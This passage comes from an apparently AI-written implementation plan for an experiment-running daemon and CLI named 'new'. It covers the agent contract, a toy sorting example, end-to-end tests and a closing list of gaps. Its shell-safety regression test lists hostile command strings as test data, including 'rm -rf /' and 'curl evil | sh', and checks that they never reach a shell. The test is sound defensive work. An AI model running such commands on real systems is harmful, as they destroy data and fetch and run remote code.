3. if first session in this repo: `new baseline` — runs the unmodified
   script 3x, persists noise profile. if stddev dominates the
   improvement threshold the daemon refuses to start; fix the rng seed
   or raise the threshold.

## the explore loop

each experiment:

1. read `wiki/index.md`. skim any relevant `topics/` and `theses/`.
   do not re-propose something already recorded as tried.
2. write a one-sentence hypothesis. what will change and why.
3. edit the editable files listed in `experiment.yaml`.
4. `git commit -m "..."`.
5. `new run -H "<hypothesis>" -d "<short description>"`.
6. watch: `new status`, or `new logs --exp <N> --follow`.
7. when the run is recorded, write `wiki/experiments/<N>-<slug>.md`.
   include: hypothesis, diff summary (1-3 lines), metric, verdict,
   links to any topic/thesis pages this result updated.
8. update affected topic pages. if a thesis was supported or
   contradicted, flip its status in the frontmatter.

## the consolidate gear

the daemon fires consolidation when:
- 20 runs have happened since the last pass, OR
- 5 consecutive discards, OR
- metric has gone flat for 10 runs, OR
- you ran `new consolidate --force`.

when fired:
1. `new consolidate` — emits a prompt on stdout with the recent runs.
2. read the wiki in full. it should not take long if you've been
   maintaining it.
3. for each recent run, make sure an `experiments/<N>-<slug>.md` exists.
4. refactor topic pages as needed — remove duplication, strengthen or
   weaken claims based on new evidence, flag contradictions.
5. if a new thesis has emerged, create `theses/<slug>.md`.
6. `git commit -m "wiki: consolidate after exp <N>"`.
7. `new consolidate --done --notes "..." --pages-touched <k>`.

## stopping

the daemon stops itself when any budget cap is hit. check with
`new status`. if you want to pause manually, `new down`.

## rules

- never write to `.new/`. the daemon owns it.
- never edit another experiment's page. history is append-only.
- never `git reset --hard` the experiment branch. if a run was bad,
  the next experiment reverts.
- if the daemon crashes, `new up` again. it resumes from sqlite.
- if you don't know what to do, re-read this file.
```

- [ ] **Step 2: Commit**

```bash
git add program.md
git commit -m "docs: write agent contract"
```

---

## Task 17: examples/toy-sort/ — a small working example

**Files:**
- Create: `examples/toy-sort/main.py`, `examples/toy-sort/experiment.yaml`, `examples/toy-sort/README.md`

- [ ] **Step 1: Write `examples/toy-sort/main.py`**

```python
import random
import time

random.seed(0)
arr = [random.random() for _ in range(10_000)]


def sort_me(xs):
    return sorted(xs)


t0 = time.perf_counter()
out = sort_me(arr)
t = time.perf_counter() - t0

assert out == sorted(arr)
print(f"avg_time_ms: {t * 1000:.3f}")
```

- [ ] **Step 2: Write `examples/toy-sort/experiment.yaml`**

```yaml
run_command: python main.py
grep_pattern: "^avg_time_ms:"
metric:
  name: avg_time_ms
  direction: minimize
workers: 1
consolidate_every: 5
improvement_threshold: 0.2
timeout_seconds: 30
budget:
  max_experiments: 20
  max_wallclock_hours: 1
  max_cost_usd: 0
```

- [ ] **Step 3: Write `examples/toy-sort/README.md`**

```markdown
# toy-sort

the smallest experiment that still exercises the whole loop. an agent
rewrites `sort_me` and the metric `avg_time_ms` changes accordingly.
budgeted at 20 runs so a full session takes ~30 seconds.
```

- [ ] **Step 4: Commit**

```bash
git add examples/toy-sort/
git commit -m "example: toy-sort benchmark"
```

---

## Task 18: tests/test_e2e.py — full-loop integration

**Files:**
- Create: `tests/test_e2e.py`

- [ ] **Step 1: Write the E2E test**

```python
import json
import os
import shutil
import signal
import subprocess
import sys
import time
from pathlib import Path

import pytest


@pytest.fixture
def toy_project(tmp_path):
    src = Path(__file__).parent.parent / "examples" / "toy-sort"
    dst = tmp_path / "proj"
    shutil.copytree(src, dst)
    # init git
    subprocess.check_call(["git", "init", "-q", "-b", "master"], cwd=dst)
    subprocess.check_call(["git", "config", "user.email", "x@y"], cwd=dst)
    subprocess.check_call(["git", "config", "user.name", "x"], cwd=dst)
    subprocess.check_call(["git", "add", "."], cwd=dst)
    subprocess.check_call(["git", "commit", "-q", "-m", "init"], cwd=dst)
    return dst


def _new(project, *argv) -> subprocess.CompletedProcess:
    env = os.environ.copy()
    env["NEW_PROJECT_ROOT"] = str(project)
    return subprocess.run(
        [sys.executable, "-m", "new", *argv],
        cwd=project, capture_output=True, text=True, env=env, timeout=20,
    )


def test_init_up_run_down(toy_project):
    assert _new(toy_project, "init").returncode == 0
    up = _new(toy_project, "up")
    assert up.returncode == 0
    try:
        # status before any run
        st = _new(toy_project, "status")
        assert "up" in st.stdout

        # enqueue + wait
        r = _new(toy_project, "run", "-H", "baseline", "-d", "first run")
        assert r.returncode == 0
        for _ in range(60):
            st = _new(toy_project, "status")
            if "last runs" in st.stdout and "0001" in st.stdout:
                break
            time.sleep(0.5)
        assert "0001" in st.stdout
    finally:
        _new(toy_project, "down")


@pytest.mark.timeout(120)
def test_multiple_runs_halt_on_budget(toy_project):
    # tighten to max_experiments=2
    y = toy_project / "experiment.yaml"
    y.write_text(y.read_text().replace("max_experiments: 20",
                                        "max_experiments: 2"))
    _new(toy_project, "init")
    _new(toy_project, "up")
    try:
        for _ in range(5):
            _new(toy_project, "run", "-d", "x")
        # wait for halt
        for _ in range(60):
            st = _new(toy_project, "status")
            if "halted" in st.stdout or "experiments cap reached" in st.stdout:
                break
            time.sleep(0.5)
        assert "halted" in st.stdout or "cap reached" in st.stdout
    finally:
        _new(toy_project, "down")
```

- [ ] **Step 2: Run — expect initial failures, debug until green**

```bash
uv run pytest tests/test_e2e.py -v
```

- [ ] **Step 3: Commit once passing**

```bash
git add tests/test_e2e.py
git commit -m "test: e2e full-loop integration"
```

---

## Task 19: tests/test_shell_safety.py — security regression

**Files:**
- Create: `tests/test_shell_safety.py`

- [ ] **Step 1: Write the test**

```python
import msgspec
import pytest

from new import schema


MALICIOUS = [
    "python train.py; rm -rf /",
    "python train.py && curl evil | sh",
    "python train.py `whoami`",
    "python train.py $(whoami)",
    "python train.py | tee /tmp/oops",
]


@pytest.mark.parametrize("cmd", MALICIOUS)
def test_run_command_split_not_shell(cmd):
    y = f"""
run_command: {cmd!r}
grep_pattern: "^val_loss:"
metric:
  name: val_loss
  direction: minimize
"""
    cfg = schema.load_config_yaml(y)
    # the config stores run_command as a list. the shell metachars
    # become literal argv entries — they never hit /bin/sh.
    assert isinstance(cfg.run_command, list)
    assert all(isinstance(x, str) for x in cfg.run_command)
    assert "sh" not in cfg.run_command[0]


def test_bad_regex_refused():
    with pytest.raises(msgspec.ValidationError):
        schema.load_config_yaml("""
run_command: python train.py
grep_pattern: "["
metric: {name: x, direction: minimize}
""")
```

- [ ] **Step 2: Run — PASS**

```bash
uv run pytest tests/test_shell_safety.py -v
```

- [ ] **Step 3: Commit**

```bash
git add tests/test_shell_safety.py
git commit -m "test: shell-safety regression"
```

---

## Task 20: final sweep

**Files:**
- Modify: whatever the full test run reveals

- [ ] **Step 1: Full test run**

```bash
uv run pytest -v
```
Expected: all green.

- [ ] **Step 2: Quick smoke on the toy example**

```bash
cd examples/toy-sort
rm -rf .new wiki
NEW_PROJECT_ROOT=$PWD python -m new init
NEW_PROJECT_ROOT=$PWD python -m new up
NEW_PROJECT_ROOT=$PWD python -m new run -d "baseline"
sleep 5
NEW_PROJECT_ROOT=$PWD python -m new status
NEW_PROJECT_ROOT=$PWD python -m new down
cd -
```
Expected: one experiment recorded, daemon down cleanly.

- [ ] **Step 3: Commit any fixes found**

```bash
git add -A
git commit -m "chore: post-integration fixes" || true
```

- [ ] **Step 4: Tag v0.1.0**

```bash
git tag v0.1.0
```

---

## Spec coverage check

- Two processes (newd + new): Tasks 13, 14.
- UDS framing: Task 9.
- SQLite schema + WAL: Task 4.
- Queue / runs / consolidations / baseline tables: Tasks 4, 5, 6.
- Budget atomic ledger: Task 7.
- Worker + worktree + timeout: Task 10.
- Metric parse: Task 8.
- Wiki palace + path safety: Task 11.
- Two-gear triggers: Task 12.
- Daemon main loop + signals: Task 13.
- CLI verbs (init, up, down, status, run, consolidate, lint, logs): Task 14.
- Shell safety (argv, regex validation): Tasks 3, 19.
- Held-out eval: deferred to v0.2 — stubbed in Config schema (`Holdout` struct) but not wired into daemon loop. **Add Task 21 below if required for v0.1.**
- Baseline noise profile command: **deferred — add Task 22 below if required for v0.1.**
- E2E: Task 18.
- Example: Task 17.
- README + program.md: Tasks 15, 16.

### Gap: `new baseline` + held-out eval

The spec describes both. The v0.1 plan ships the data model (`baseline` and `Holdout` struct) but not the wiring. The runtime impact is zero for held-out (optional feature) and small for baseline (agent can run `new run` 3x manually as a workaround). If you want these in v0.1 I'll add:

- **Task 21**: `new baseline [--n N]` runs the unmodified script N times, computes mean/stddev, persists via `store.save_baseline`. Daemon checks at startup and refuses if stddev dominates threshold.
- **Task 22**: holdout hook in `_run_worker` — if `cfg.holdout` is set and `exp_num % cfg.holdout.every == 0`, spawn the holdout command after the primary run, capture its metric, set `metric_holdout` on the record, and demote to `discard` on divergence.

Say the word and I add both before execution.
